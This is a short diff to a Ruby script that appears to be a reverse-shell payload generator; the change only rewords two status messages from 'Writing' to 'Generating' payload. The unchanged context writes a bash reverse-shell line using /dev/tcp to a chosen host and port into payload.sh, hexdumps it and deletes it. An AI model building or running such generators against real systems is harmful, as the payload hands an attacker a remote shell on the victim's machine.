@@ -50,7 +50,7 @@ end
   
 begin
     sleep(0.5)
-    puts "#{g}Writing payload..."
+    puts "#{g}Generating payload..."
     sleep(1)
     open('payload.sh', 'w') { |f|
         f.puts "#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &"
@@ -59,5 +59,5 @@ begin
     system("hexdump payload.sh")
     system("rm payload.sh")
 rescue
-    puts "#{e}Failed to write payload!"
+    puts "#{e}Failed to generate payload!"
 end
